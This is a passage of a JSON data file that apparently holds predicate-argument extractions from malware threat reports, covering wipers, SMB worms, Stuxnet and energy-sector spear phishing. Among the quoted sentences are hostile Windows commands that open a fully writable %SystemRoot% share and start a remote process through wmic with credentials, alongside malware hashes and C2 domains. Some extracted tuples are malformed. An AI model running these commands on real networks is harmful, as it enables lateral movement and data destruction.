"Implants in this malware family"]}}, {"listen": {"A": "listen", "S": "Implants in this malware family", "O": ["on TCP port 443"]}}], " Each message sent to\nand from this implant is preceded with its length, then XOR encoded with the byte 0x1F": [{"sent": {"A": "sent", "O": ["Each message", "to this implant from sent Each message"]}, "XOR encoded": {"A": "XOR encoded", "O": ["Each message", "with the byte 0x1F"]}}], " The listener can also perform arbitrary code execution and execute commands on the command line": [{"perform": {"A": "perform", "S": "The listener", "O": ["arbitrary code execution"]}, "execute": {"A": "execute", "S": "The listener", "O": ["on the command line", "commands"]}}], " The malware uses several methods to access shares on the remote systems to\nbegin wiping files": [{"wiping": {"A": "wiping", "S": "The malware", "O": ["files"]}, "access": {"A": "access", "S": "The malware", "O": ["on the remote systems", "shares"]}}], " It has 3 files contained in the resource section; all xor\u2019d with 0x63": [{"xor\u2019d": {"A": "xor\u2019d", "O": ["with 0x63", "all"]}}], " Once successful, the malware uploads a copy of the wiper file \u201ctaskhostXX.exe\u201d, changes the file-time\nto match that of the built-in file \u201ccalc.exe\u201d, and starts the remote process": [{"changes": {"A": "changes", "O": ["the file-time", "to match that of the built-in file \u201ccalc.exe\u201d"]}}, {"uploads": {"A": "uploads", "S": "the malware", "O": ["a copy of the wiper file \u201ctaskhostXX.exe\u201d"]}}, {"starts": {"A": "starts", "O": ["the remote process"]}}], " Based on the\nusername/password provided in the configuration file and the hostname/IP address of target systems, the malware will access remote network shares in order to\nupload a copy of the wiper and begin the wiping process on these remote systems": [{"begin": {"A": "begin", "S": "the malware", "O": ["the wiping process", "on these remote systems"]}, "access": {"A": "access", "S": "the malware", "O": ["remote network shares"]}, "upload": {"A": "upload", "S": "the malware", "O": ["a copy of the wiper"]}}], "\n\n\n<list>\nName: iissvr.exe\n\nSize: 114688 bytes (114.7 KB)\n\nMD5: E1864A55D5CCB76AF4BF7A0AE16279BA\n\nPE Compile Time: 2014-11-13 02:05:35\n</list>\n\n\nThis file, when executed, starts a listener on localhost port 80": [{"starts": {"A": "starts", "S": "This file", "O": ["on localhost port 80", "a listener"]}}], "\n\nListening Implant: During installation of this tool, a portion of the binaries is decrypted using AES, with a key derived from the phrase \"National Football League.\"\nAdditionally, this implant listens for connections on TCP port 195 (for \"sensvc.exe\" and \"msensvc.exe\") and TCP port 444 (for \"netcfg.dll\")": [{"listens": {"A": "listens", "S": "this implant", "O": ["for connections", "on TCP port 195 (for \"sensvc.exe\" and \"msensvc.exe\") and TCP port 444 (for \"netcfg.dll\")"]}}], " It is dropped from resource ID 0x81 of \u201cigfxtrayex.exe\u201d": [{"is dropped": {"A": "is dropped", "O": ["from resource ID 0x81 of \u201cigfxtrayex.exe\u201d", "It"]}}], " It connects home every five minutes to send log data\nback to command and control (C2) infrastructure if it has successfully spread to other Windows hosts via SMB port 445": [{"spread": {"A": "spread", "S": "it", "O": ["via SMB port 445", "to other Windows hosts"]}}, {"send": {"A": "send", "S": "It", "O": ["log data", "back to command and control (C2) infrastructure"]}, "connects": {"A": "connects", "S": "It", "O": ["home", "every five minutes"]}}], " Network connection attempts are made to one of three hard-coded IP addresses in a random\norder to port 8080 or 8000": [{"are made": {"A": "are made", "O": ["in a random order", "to one of three hard-coded IP addresses", "Network connection attempts", "to port 8080 or 8000"]}}], "\n\nDestructive Hard Drive Tool: This tool is a tailored hard-drive wiping tool that is intended to destroy data past the point of recovery and to complicate the victim\nmachine\u2019s recovery": [{"is": {"A": "is", "S": "This tool", "O": ["a tailored hard-drive wiping tool"]}, "destroy": {"A": "destroy", "S": "This tool", "O": ["data", "past the point of recovery"]}, "complicate": {"A": "complicate", "S": "This tool", "O": ["he victim machine\u2019s recovery"]}}], " (There is a caveat for machines installed with the windows 7 operating system: windows 7 machines\nwill continue to operate in a degraded state with the targeted files destroyed until after reboot, in which the infected MBR then wipes the drive.) If the actor has\nuser-level access, the result includes specific files being deleted and practically irrecoverable, but the victim machine would remain usable": [{"being deleted": {"A": "being deleted", "O": ["specific files"]}}, {"wipes": {"A": "wipes", "S": "the infected MBR", "O": ["the drive"]}}, {"destroyed": {"A": "destroyed", "O": ["the targeted files"]}}], " A 120-minute (2 hour)\nsleep command is issued after which the computer is shut down and rebooted": [{"is issued": {"A": "is issued", "O": ["A 120-minute (2 hour) sleep command"]}}, {"is shut down and rebooted": {"A": "is shut down and rebooted", "O": ["the computer"]}}], " The \u201cWinsSchMgmt\u201d service\nexecuted the file with \u201c-k\u201d as an argument, which started another instance of the file using \u201c-s\u201d as an argument": [{"started": {"A": "started", "S": "The \u201cWinsSchMgmt\u201d service", "O": ["using \u201c-s\u201d as an argument", "another instance of the file"]}, "executed": {"A": "executed", "S": "The \u201cWinsSchMgmt\u201d service", "O": ["with \u201c-k\u201d as an argument", "the file"]}}], " Checking for existing shares via \u201c\\\\hostname\\admin$\\system32\u201d and \u201c\\\\hostname\\shared$\\system32\u201d or create a new share \u201ccmd.exe /q /c net\nshare shared$=%SystemRoot% /GRANT:everyone, FULL\u201d": [{"create": {"A": "create", "O": ["a new share \u201ccmd.exe /q /c net share shared$=%SystemRoot% /GRANT:everyone, FULL\u201d"]}}, {"Checking": {"A": "Checking", "O": ["via \u201c\\\\hostname\\admin$\\system32\u201d and \u201c\\\\hostname\\shared$\\system32\u201d", "for existing shares"]}}], "\n\n\n<list>\nName: igfxtrayex.exe\n\fSize: 249856 bytes (249.9 KB)\n\nMD5: 760C35A80D758F032D02CF4DB12D3E55\n\nPE Compile Time: 2014-11-24 04:11:08\n</list>\n\n\nThis file is destructive malware: a disk wiper with network beacon capabilities": [{"is": {"A": "is", "S": "This file", "O": ["destructive malware"]}}], " If the CNE operator has administrator-level privileges on the host, the program will over-write portions of up-to the first four physical drives\nattached, and over-write the master boot record (MBR) with a program designed to cause further damage if the hard drive is re-booted": [{"over-write": {"A": "over-write", "S": "the program", "O": ["with a program designed to cause further damage if the hard drive is re-booted", "the master boot record (MBR)"]}}], " The controller sends the byte \"!\" (0x21) to end the network connection": [{"sends": {"A": "sends", "S": "The controller", "O": ["the byte \"!\" (0x21)", "to end the network connection"]}}], "\n\n\n<list>\nName: net_ver.dat\n\nSize: 4572 bytes (4.6 KB) (size will vary)\n\nMD5: 93BC819011B2B3DA8487F964F29EB934 (hash will vary)\n</list>\n\n\nThis is a log file created by the dropper, and appended to as the scans progress": [{"created": {"A": "created", "S": "the dropper", "O": ["a log file"]}}], " This tool contains five components \u2013 a listening implant, lightweight backdoor,\nproxy tool, destructive hard drive tool, and destructive target cleaning tool": [{"contains": {"A": "contains", "S": "This tool", "O": ["proxy tool"]}}], " The second instance of the dropper file\ninstalled itself as the \u201cWinsSchMgmt\u201d service with \u201c-k\u201d as a command line argument, started the service, and then terminated": [{"installed": {"A": "installed", "S": "The second instance of the dropper file", "O": ["itself", "with \u201c-k\u201d as a command line argument", "as the \u201cWinsSchMgmt\u201d service"]}, "started": {"A": "started", "S": "The second instance of the dropper file", "O": ["the service"]}, "terminated": {"A": "terminated", "S": "The second instance of the dropper file"}}], " Afterwards, the\nremote network share is removed via \u201ccmd.exe /q /c net share shared$ /delete\u201d": [{"is removed": {"A": "is removed", "O": ["the remote network share", "via \u201ccmd.exe /q /c net share shared$ /delete\u201d"]}}], " The remote process is started via the command \u201ccmd.exe /c wmic.exe /node:hostname\n/user:username /password:pass PROCESS CALL CREATE\u201d": [{"is started": {"A": "is started", "O": ["The remote process", "via the command \u201ccmd.exe /c wmic.exe /node:hostname /user:username /password:pass PROCESS CALL CREATE\u201d"]}}], " The tool also accepts new scan tasking\nwhen it connects to C2": [{"accepts": {"A": "accepts", "S": "The tool", "O": ["when it connects to C2", "new scan tasking"]}}], " This file serves as a dropper": [{"serves": {"A": "serves", "S": "This file", "O": ["as a dropper"]}}], " It drops destructive malware: \u201cigfxtrayex.exe\u201d": [{"drops": {"A": "drops", "S": "It", "O": ["destructive malware: \u201cigfxtrayex.exe\u201d"]}}], " If a connection to the IP address cannot be made, it attempts to connect to another of the three IP addresses, until connections to all\nthree IP addresses have been attempted": [{"connect": {"A": "connect", "S": "it", "O": ["until connections to all three IP addresses have been attempted", "to another of the three IP addresses"]}}], "\n\nLightweight Backdoor: This is a backdoor listener that is designed as a service DLL": [{"is": {"A": "is", "S": "This", "O": ["a backdoor listener"]}}], " After 10 minutes, the \u201cigfxtrayex.exe\u201d makes three copies of itself and places them in the same directory from which it was executed": [{"makes": {"A": "makes", "S": "the \u201cigfxtrayex.exe\u201d", "O": ["three copies of itself"]}}], "\n\nSMB Worm Tool: This worm uses a brute force authentication attack to propagate via Windows SMB shares": [{"propagate": {"A": "propagate", "S": "This worm", "O": ["via Windows SMB shares"]}, "uses": {"A": "uses", "S": "This worm", "O": ["a brute force authentication attack"]}}], " These copies are then executed, each with a\ndifferent argument (one being \u201c-m\u201d, one being \u201c-d\u201d and the other \u201c-w\u201d)": [{"are then executed": {"A": "are then executed", "O": ["These copies"]}}], " One is to send spear phishing\nemails, where a link to a malicious website or a malicious attachment is delivered using social engineering\ntechniques": [{"is delivered": {"A": "is delivered", "O": ["a link to a malicious website or a malicious attachment", "using social engineering techniques"]}}, {"send": {"A": "send", "O": ["spear phishing emails"]}}], "\n\n    A wave of spear phishing emails were sent from two Freemailer accounts to 291 individuals at the targeted\n    company": [{"were sent": {"A": "were sent", "O": ["from two Freemailer accounts", "to 291 individuals at the targeted company", "A wave of spear phishing emails"]}}], " In\n  addition, spear phishing messages were used to compromise additional computers": [{"were used": {"A": "were used", "O": ["spear phishing messages", "to compromise additional computers"]}}], " The second method, which is gaining traction, is watering hole attacks, where the attacker infects a\nwebsite that has a high likelihood of being visited by the intended victim": [{"infects": {"A": "infects", "S": "the attacker", "O": ["a website that has a high likelihood of being visited by the intended victim"]}}, {"is": {"A": "is", "S": "The second method", "O": ["watering hole attacks"]}}], "\n\n    It is also clear that the energy sector is not exempt from the generic attacks that every company faces, such\n    as ransomware that locks PCs or financial Trojans that attempt to steal passwords and credit card details": [{"locks": {"A": "locks", "S": "ransomware", "O": ["PCs"]}}, {"steal": {"A": "steal", "S": "financial Trojans", "O": ["passwords and credit card details"]}}], "\n\n  The dropper component is responsible for creating all the required files on the system, registering a service\n  called \u201cTrkSvr\u201d in order to start itself with Windows": [{"creating": {"A": "creating", "S": "The dropper component", "O": ["all the required files on the system"]}, "registering": {"A": "registering", "S": "The dropper component", "O": ["a service called \u201cTrkSvr\u201d"]}, "start": {"A": "start", "S": "The dropper component", "O": ["with Windows", "itself"]}}], " With more specialized teams of attackers, we can often observe that the\ninfected system is first analyzed to ensure that it is of interest to them": [{"is first analyzed": {"A": "is first analyzed", "O": ["the infected system", "to ensure that it is of interest to them"]}}], " For example, some malware\nsamples will send the data in smaller bursts so as not to swamp the network or generate network spikes that might\nattract attention": [{"send": {"A": "send", "S": "some malware samples", "O": ["so as not to swamp the network or generate network spikes that might attract attention", "in smaller bursts", "the data"]}}], "\n\n    The back door provides full remote access to the compromised computers, allowing for extraction of any data": [{"provides": {"A": "provides", "S": "The back door", "O": ["full remote access", "to the compromised computers"]}, "allowing": {"A": "allowing", "S": "The back door", "O": ["for extraction of any data"]}}], " This halted machinery, preventing oil tankers from loading for eight hour till the unaffected\n    backup code was reinstalled on the PLCs": [{"preventing": {"A": "preventing", "S": "This", "O": ["for eight hour", "from loading", "till the unaffected backup code was reinstalled on the PLCs", "oil tankers"]}, "halted": {"A": "halted", "S": "This", "O": ["machinery"]}}], " Spreading through infected\n  portable media drives allowed it to also infect networks isolated by air gaps that are unreachable from the\n  Internet": [{"Spreading": {"A": "Spreading", "S": "it", "O": ["through infected portable media drives"]}, "infect": {"A": "infect", "S": "it", "O": ["networks isolated by air gaps that are unreachable from the Internet"]}}], " The malware deletes all files\n\n\n\n\n                                     <footer>       Page 27</footer>\n\f                                                              <header>  Targeted Attacks Against the Energy Sector</header>\n\n\n\n\n   on a computer and then deletes the master boot record, rendering the computer unusable": [{"rendering": {"A": "rendering", "S": "The malware", "O": ["unusable", "the computer"]}, "deletes": {"A": "deletes", "S": "The malware", "O": ["the master boot record"]}}], " The sabotage payload disrupted and\n  partially destroyed the cascaded high frequency gas centrifuges": [{"disrupted and partially destroyed": {"A": "disrupted and partially destroyed", "S": "The sabotage payload", "O": ["the cascaded high frequency gas centrifuges"]}}], " The attacks started in late 2009 and were directed\n  at finding project details and financial information about oil and gas field exploration and bids": [{"finding": {"A": "finding", "S": "The attacks", "O": ["project details and financial information about oil and gas field exploration and bids"]}}], "\n\n  On compromised computers a common Backdoor.Trojan was installed that communicated back to the\n  C&C server, allowing remote access to the computer": [{"communicated": {"A": "communicated", "S": "a common Backdoor.Trojan", "O": ["back to the C&C server"]}, "allowing": {"A": "allowing", "S": "a common Backdoor.Trojan", "O": ["remote access to the computer"]}}, {"was installed": {"A": "was installed", "O": ["a common Backdoor.Trojan", "On compromised computers"]}}], " It also attempts to copy itself to accessible network shares\n  and execute itself remotely if successfully copied": [{"copy": {"A": "copy", "S": "It", "O": ["to accessible network shares", "itself"]}, "execute": {"A": "execute", "S": "It", "O": ["remotely", "itself", "if successfully copied"]}}], " Since most employees use laptops, the malware can use location awareness to detect if the\ncompromised computer is outside of the corporate network and send the data once it\u2019s directly connected to the\nInternet, such as from a Wi-Fi hotspot at an airport": [{"send": {"A": "send", "S": "the malware", "O": ["the data", "once it\u2019s directly connected to the Internet, such as from a Wi-Fi hotspot at an airport"]}, "use": {"A": "use", "S": "the malware", "O": ["location awareness", "to detect if the compromised computer is outside of the corporate network"]}}], " Disttrack\u2019s secondary goal may have\n  been to steal valuable information from infected computers, but the main intent was to render the computers\n  unusable by wiping the operating system and master boot record, causing disruption and downtime at the\n  targeted company": [{"render": {"A": "render", "S": "Disttrack", "O": ["the computers unusable"]}, "wiping": {"A": "wiping", "S": "Disttrack", "O": ["the operating system and master boot record"]}, "steal": {"A": "steal", "S": "Disttrack", "O": ["valuable information", "from infected computers"]}}], " Tricks like these, to make the detection of the malware more\n  difficult, are now frequently used in modern targeted attacks": [{"make": {"A": "make", "S": "Tricks like these", "O": ["the detection of the malware", "more difficult"]}}], " After that comes the discovery phase, where the attacker gathers\n    passwords and maps the internal network": [{"gathers": {"A": "gathers", "S": "the attacker", "O": ["passwords"]}, "maps": {"A": "maps", "S": "the attacker", "O": ["the internal network"]}}], " They were made to appear to be linked to the\ncompany in relation to the subject and attachment chosen": [{"were made": {"A": "were made", "O": ["to appear to be linked to the company in relation to the subject and attachment chosen", "They"]}}], " More sophisticated attackers obfuscate the data by XOR-ing it, encrypting it with proper\nasymmetric encryption or embedding it into media files using steganography to hide the data from traffic inspection": [{"obfuscate": {"A": "obfuscate", "S": "More sophisticated attackers", "O": ["the data", "by XOR-ing it, encrypting it with proper asymmetric encryption or embedding it into media files using steganography", "to hide the data from traffic inspection"]}}], " The malware chosen\nwas a variant of the Poison Ivy Trojan Backdoor.Darkmoon and, in some minor cases, Trojan droppers that would\ndownload additional malware": [{"download": {"A": "download", "S": "Trojan droppers", "O": ["additional malware"]}}, {"was": {"A": "was", "S": "The malware chosen", "O": ["a variant of the Poison Ivy Trojan Backdoor.Darkmoon"]}}], " Besides this, it also spread through network\n  shares, a printer spooler vulnerability, an old Windows RPC (remote procedure calls) vulnerability and a known\n  password in the WinCC database": [{"spread": {"A": "spread", "O": ["through a known password in the WinCC database"]}}, {"spread": {"A": "spread", "O": ["through an old Windows RPC (remote procedure calls) vulnerability"]}}, {"spread": {"A": "spread", "S": "it", "O": ["through network shares"]}}, {"spread": {"A": "spread", "O": ["through a printer spooler vulnerability"]}}], " As far as we know today, the Stuxnet operation began in November 2005 with the registration\n  of the command and control (C&C) servers used in the attacks": [{"began": {"A": "began", "S": "the Stuxnet operation", "O": ["with the registration of the command and control (C&C) servers used in the attacks", "in November 2005"]}}], " The simple attacks compress the files and upload them through FTP or through a HTTP POST request\nto a remote drop server": [{"upload": {"A": "upload", "S": "The simple attacks", "O": ["through a HTTP POST request to a remote drop server", "them"]}, "compress": {"A": "compress", "S": "The simple attacks", "O": ["the files"]}}], " The early version of Stuxnet targeted the S7-\n  417 PLCs and modified its valve settings": [{"targeted": {"A": "targeted", "S": "The early version of Stuxnet", "O": ["the S7- 417 PLCs"]}, "modified": {"A": "modified", "S": "The early version of Stuxnet", "O": ["its valve settings"]}}], "\n\n  Stuxnet is a sophisticated piece of malware, which uses seven vulnerabilities to spread and infect its targets": [{"uses": {"A": "uses", "S": "Stuxnet", "O": ["to spread and infect its targets", "seven vulnerabilities"]}}], " This can enable the attacker to\nswap an update of legitimate software for a maliciously crafted version": [{"swap": {"A": "swap", "S": "the attacker", "O": ["an update of legitimate software", "for a maliciously crafted version"]}}], " In\nsuch cases, a previously compromised computer in the DMZ can act as a proxy, forwarding all the collected data": [{"act": {"A": "act", "S": "a previously compromised computer in the DMZ", "O": ["as a proxy"]}, "forwarding": {"A": "forwarding", "S": "a previously compromised computer in the DMZ", "O": ["all the collected data"]}}], " On the USB drive itself, the malware would hide its own files and even delete\n  itself from it after three successful propagations": [{"delete": {"A": "delete", "S": "the malware", "O": ["after three successful propagations", "from it", "itself"]}, "hide": {"A": "hide", "S": "the malware", "O": ["its own files"]}}], "\n  To hide its activity even further, Stuxnet executed slightly different infection routines depending on the security\n  software installed on the target": [{"executed": {"A": "executed", "S": "Stuxnet", "O": ["slightly different infection routines depending on the security software installed on the target", "To hide its activity even further"]}}], "\n\nThe emails all contained malicious attachments": [{"contained": {"A": "contained", "S": "The emails all", "O": ["malicious attachments"]}}], " The malware collects file names and starts overwriting them\n  with a JPEG image or 192KB blocks of random data": [{"overwriting": {"A": "overwriting", "S": "The malware", "O": ["them", "with a JPEG image or 192KB blocks of random data"]}, "collects": {"A": "collects", "S": "The malware", "O": ["file names"]}}], "\n\nOne of the obvious tasks performed by attackers is to install key loggers, dump local credentials, search local\nstorage for saved accounts and sniff the network for passwords": [{"install": {"A": "install", "S": "attackers", "O": ["key loggers"]}, "dump": {"A": "dump", "S": "attackers", "O": ["local credentials"]}, "search": {"A": "search", "S": "attackers", "O": ["for saved accounts", "local storage"]}, "sniff": {"A": "sniff", "S": "attackers", "O": ["the network", "for passwords"]}}], "\n\n  By acquiring user credentials and gaining access to the domain controller the attackers were able to push the\n  malware on to many systems before they triggered the destructive payload": [{"push": {"A": "push", "S": "the attackers", "O": ["on to many systems", "before they triggered the destructive payload", "the malware"]}, "acquiring": {"A": "acquiring", "S": "the attackers", "O": ["user credentials"]}}], "\n<figure></figure>\n<caption>Figure 9: Typical commands used during discovery phase</caption>\nIf the target is assumed to be in a separated network not connected to the Internet, the malware used might try and\nautonomously infect removable drives, like USB sticks, or project files for PLCs": [{"autonomously infect": {"A": "autonomously infect", "S": "the malware", "O": ["removable drives, like USB sticks, or project files for PLCs"]}}], " The attackers used a Trojan to gain access to the control for the gas pipelines": [{"used": {"A": "used", "S": "The attackers", "O": ["a Trojan", "to gain access to the control for the gas pipelines"]}}], "\n\nThe social engineering messages concentrated mainly around the following two themes:\n<list>\nE-books and newspapers:\n\u2022\t E-Book.pdf.exe\n\u2022\t BusinessWeek.pdf.exe\n\u2022\t Financial Times E-Paper.pdf.exe\n\u2022\t The Economist Print Edition.pdf.exe\n\u2022\t The NY Times In Print.pdf.exe\nFree desktop tools:\n\u2022\t Babylon9 - Greek.exe\n\u2022\t Google Desktop Translator.exe\n\u2022\t SMS Free Sender Desktop.exe\n\u2022\t BBC iPlayer.exe\n\u2022\t Sticky Notes Desktop.exe\n</list>\nOnce installed, the back door would create a registry run key in order to restart with Windows and connect to\none of three C&C servers located in Greece": [{"restart": {"A": "restart", "S": "the back door", "O": ["with Windows"]}, "create": {"A": "create", "S": "the back door", "O": ["a registry run key"]}, "connect": {"A": "connect", "S": "the back door", "O": ["to one of three C&C servers located in Greece"]}}, {"installed": {"A": "installed", "O": ["the back door"]}}], "\n\nSome groups carefully plan watering hole attacks": [{"plan": {"A": "plan", "S": "Some groups", "O": ["watering hole attacks"]}}], " The\n  payload would only become active if the fingerprint in the found PLC setup matched a given configuration setup": [{"become": {"A": "become", "S": "The payload", "O": ["active", "if the fingerprint in the found PLC setup matched a given configuration setup"]}}], " All of the emails contained the same\n    Trojan.Dropper disguised as an attachment with the filename AVP.dll": [{"contained": {"A": "contained", "S": "All of the emails", "O": ["the same Trojan.Dropper"]}}, {"disguised": {"A": "disguised", "S": "the same Trojan.Dropper", "O": ["as an attachment with the filename AVP.dll"]}}], "\n\n  The reporter component is responsible for sending back a HTTP GET request to the C&C server": [{"sending": {"A": "sending", "S": "The reporter component", "O": ["back a HTTP GET request", "to the C&C server"]}}], " In some instances\nthey might even use zero-day\nvulnerabilities to spread further into\nthe network": [{"use": {"A": "use", "S": "they", "O": ["to spread further into the network", "zero-day vulnerabilities"]}}], " This allows\n    malware to spread into such isolated networks as demonstrated many times by threats such as Stuxnet": [{"spread": {"A": "spread", "S": "malware", "O": ["into such isolated networks", "as demonstrated many times by threats such as Stuxnet"]}}], " Stuxnet is the first known autonomous\n  threat to target and sabotage industrial control systems to such an extent": [{"target and sabotage": {"A": "target and sabotage", "S": "Stuxnet", "O": ["industrial control systems"]}}], " The attacker usually compromises the network by delivering targeted\nmalware to vulnerable systems or employees": [{"compromises": {"A": "compromises", "S": "The attacker", "O": ["the network"]}, "delivering": {"A": "delivering", "S": "The attacker", "O": ["targeted malware", "to vulnerable systems or employees"]}}], " Details of this attack\n    are scarce and vague, but it seems that during a strike an attacking group managed to get access to the SCADA\n    network of the oil tanker loading machinery and overwrote programmable logic controllers (PLCs) with an empty\n    program module": [{"get": {"A": "get", "S": "an attacking group", "O": ["access to the SCADA network of the oil tanker loading machinery"]}, "overwrote": {"A": "overwrote", "S": "an attacking group", "O": ["programmable logic controllers (PLCs)", "with an empty program module"]}}], " This might allow the traffic to bypass perimeter security and\nreceive less scrutiny": [{"bypass": {"A": "bypass", "S": "the traffic", "O": ["perimeter security"]}, "receive": {"A": "receive", "S": "the traffic", "O": ["less scrutiny"]}}], "\n\n  The attackers started by compromising public facing Web servers through SQL injection and installing Web\n  shells on them": [{"compromising": {"A": "compromising", "S": "The attackers", "O": ["through SQL injection and installing Web shells on them", "public facing Web servers"]}}], " To avoid detection by personnel monitoring the human machine\n  interface (HMI) of the plant, the threat recorded measurement readings during normal operation and played\n  those back in a loop": [{"recorded": {"A": "recorded", "S": "the threat", "O": ["measurement readings during normal operation"]}, "played": {"A": "played", "S": "the threat", "O": ["those back in a loop"]}}], " This allowed the worm to infect\n  computers whenever the engineer exchanged the project files": [{"infect": {"A": "infect", "S": "the worm", "O": ["whenever the engineer exchanged the project files", "computers"]}}], " This could allow the malware to be\nmanually introduced to the destination network, without the knowledge of the carrier, essentially jumping air gaps\ninto isolated networks": [{"jumping": {"A": "jumping", "S": "the malware", "O": ["into isolated networks", "air gaps"]}, "introduced": {"A": "introduced", "S": "the malware", "O": ["to the destination network"]}}], " This allowed them to move on to other internal computers using the gathered passwords": [{"move": {"A": "move", "S": "them", "O": ["using the gathered passwords", "on to other internal computers"]}}], " The attack was carried out over eight days and used the same infected Microsoft\n   Word document in every instance": [{"used": {"A": "used", "S": "The attack", "O": ["in every instance", "the same infected Microsoft Word document"]}}], " The back door provided full access to the\n    compromised computers": [{"provided": {"A": "provided", "S": "The back door", "O": ["full access to the compromised computers"]}}], "\n</section>\n<section>\n  <heading>2003</heading>\n    In 2003 the safety monitoring system of the Ohio nuclear power plant apparently went offline for several hours\n    due to a Slammer worm infection": [{"went": {"A": "went", "S": "the safety monitoring system of the Ohio nuclear power plant", "O": ["offline", "for several hours", "due to a Slammer worm infection"]}}], "\n\n   As an example, the subject line \u201cWage Data 2012\u201d was used in 944 emails, sent from 26 different email addresses\n   to targets in nine different sectors": [{"sent": {"A": "sent", "O": ["to targets in nine different sectors", "from 26 different email addresses", "944 emails"]}, "was used": {"A": "was used", "O": ["\u201cWage Data 2012\u201d", "in 944 emails"]}}], " By using IP address filters before infecting\nany visitor of such sites, the attacker can reduce the number of infected systems and bring it to a manageable\nquantity which can be assessed manually at another time": [{"using": {"A": "using", "S": "the attacker", "O": ["before infecting any visitor of such sites", "IP address filters"]}}], " The last C&C server has been used since 2010 in similar attacks\nagainst other companies": [{"been used": {"A": "been used", "O": ["since 2010", "The last C&C server", "in similar attacks against other companies"]}}], " This allowed the attacker to find and extract valuable\n  information": [{"find": {"A": "find", "S": "the attacker"}, "extract": {"A": "extract", "S": "the attacker"}}], " Once they had control over the server they used common hacking tools to harvest local\n\n\n\n\n                                        <footer>      Page 11</footer>\n\f                                                           <header>     Targeted Attacks Against the Energy Sector</header>\n\n\n\n\n  passwords, dump password hashes, sniff authentication messages and exploit internal active directory\n  configuration": [{"sniff": {"A": "sniff", "S": "they", "O": ["authentication messages"]}, "dump": {"A": "dump", "S": "they", "O": ["password hashes"]}, "harvest": {"A": "harvest", "S": "they", "O": ["local passwords"]}}], "\n\nOne method which is gaining more\nrelevance is the hijacking of local\nsoftware distribution systems for\nfurther distribution": [{"hijacking": {"A": "hijacking", "O": ["for further distribution", "local software distribution systems"]}}], " At the end Disttrack finishes the computer off by wiping the\n  master boot record with the same data": [{"wiping": {"A": "wiping", "S": "Disttrack", "O": ["the master boot record", "with the same data"]}}], " Although wiping is also frequently used to destroy evidence of the attack and make forensics\n  more difficult": [{"make": {"A": "make", "S": "wiping", "O": ["forensics"]}, "destroy": {"A": "destroy", "S": "wiping", "O": ["evidence of the attack"]}}], " Once the victim installs the genuine looking\nupdate, the attacker effectively gains control over the computer": [{"gains": {"A": "gains", "S": "the attacker", "O": ["control over the computer", "Once the victim installs the genuine looking update"]}}], "\n\n    The malware itself drops a malicious Downloader \u201cclbcatq.dll\u201d into a newly created \u201cwuauclt\u201d directory, posing\n    as Windows update and taking advantage of the DLL search order hijack weakness in order to load the malicious\n    code in Windows": [{"posing": {"A": "posing", "S": "a malicious Downloader \u201cclbcatq.dll\u201d", "O": ["as Windows update"]}, "load": {"A": "load", "S": "a malicious Downloader \u201cclbcatq.dll\u201d", "O": ["the malicious code", "in Windows"]}}, {"drops": {"A": "drops", "S": "The malware itself", "O": ["a malicious Downloader \u201cclbcatq.dll\u201d", "into a newly created \u201cwuauclt\u201d directory"]}}], " Once the attackers have\nsuccessfully managed to create\nand distribute their own package,       \nthey can easily infect all connected\nsystems at once": [{"infect": {"A": "infect", "S": "they", "O": ["all connected systems", "at once"]}}], " It reports the\n  domain name, IP address and number of files overwritten": [{"reports": {"A": "reports", "S": "It", "O": ["the domain name, IP address and number of files overwritten"]}}], " A few days later the group resumed the watering hole attack again,\nthis time using a different exploit": [{"resumed": {"A": "resumed", "S": "the group", "O": ["using a different exploit", "the watering hole attack"]}}], " In addition, it is able to infect Step7\n  project files, which are used to control Programmable Logic Controllers (PLCs)": [{"infect": {"A": "infect", "S": "it", "O": ["Step7 project files, which are used to control Programmable Logic Controllers (PLCs)"]}}], " Number of emails targeting the company per day</caption>\nThe spear phishing emails came from 234 spoofed addresses": [{"came": {"A": "came", "S": "The spear phishing emails", "O": ["from 234 spoofed addresses"]}}], "\n\n    At the beginning of 2003 a marine terminal in Venezuela was targeted by a sabotage attack": [{"was targeted": {"A": "was targeted", "S": "a sabotage attack", "O": ["a marine terminal in Venezuela"]}}], " The final stage is capture and exfiltration, where the valuable\n    information is copied and sent back to the attacker": [{"sent back": {"A": "sent back", "O": ["the valuable information", "to the attacker"]}, "is copied": {"A": "is copied", "O": ["the valuable information"]}}], " These can be performed either at the same\nphysical location, posing as a genuine Wi-Fi hotspot or through supply chain attacks": [{"posing": {"A": "posing", "O": ["as a genuine Wi-Fi hotspot"]}}], " The later version of the threat focused on the S7-315 PLCs,\n  manipulating the spinning frequency of the rotating motors": [{"focused": {"A": "focused", "S": "The later version of the threat", "O": ["on the S7-315 PLCs"]}, "manipulating": {"A": "manipulating", "S": "The later version of the threat", "O": ["the spinning frequency of the rotating motors"]}}], "\nSimple system commands can help the attacker to learn about installed security tools, saved links to internal\n\n\n\n\n                                      <footer>               Page 26</footer>\n\f                                                    <header>           Targeted Attacks Against the Energy Sector</header>\n\n\n\n\nplatforms and local address books": [{"learn": {"A": "learn", "S": "the attacker", "O": ["about installed security tools, saved links to internal platforms and local address books"]}}], "\n\nIn this phase the interesting data is gathered and sent back to the attackers": [{"sent back": {"A": "sent back", "O": ["to the attackers", "the interesting data"]}, "is gathered": {"A": "is gathered", "O": ["the interesting data"]}}], "\n<list>\n\u2022\t updates.zyns.com\n\u2022\t amazoaws.dyndns-office.com\n\u2022\t msupdate.3utilities.com\n</list>\n\n\n\n\n                                           <footer> Page 15</footer>\n\f                                                               <header>    Targeted Attacks Against the Energy Sector</header>\n\n\n\n\n    The chosen names of the C&C server domains imitates legitimate services in a bid to be overlooked by the system\n    administrators when checking their logs": [{"imitates": {"A": "imitates", "S": "The chosen names of the C&C server domains", "O": ["in a bid to be overlooked by the system administrators when checking their logs", "legitimate services"]}}], " However, sabotage attacks that damage equipment\n    are definitely possible, as has already been demonstrated": [{"damage": {"A": "damage", "S": "sabotage attacks", "O": ["equipment"]}}], " There have\n    already been proof of concept attacks that demonstrate how smart meters could be manipulated to send\n    back false information or report incorrect billing IDs, leading to power theft": [{"be manipulated": {"A": "be manipulated", "O": ["smart meters", "to send back false information or report incorrect billing IDs, leading to power theft"]}}], "\n\nAt the end of the discovery phase the attackers should know the internals of the infected networks and have\nidentified systems with interesting data or with connected industrial control systems": [{"know": {"A": "know", "S": "the attackers", "O": ["the internals of the infected networks"]}, "identified": {"A": "identified", "S": "the attackers", "O": ["systems with interesting data or with connected industrial control systems"]}}], " The module then drops a legitimate and digitally signed device driver that\n  provides low level disk access from user space": [{"drops": {"A": "drops", "S": "The module", "O": ["a legitimate and digitally signed device driver that provides low level disk access from user space"]}}], "\n </cover>\n\f                                                               <header>     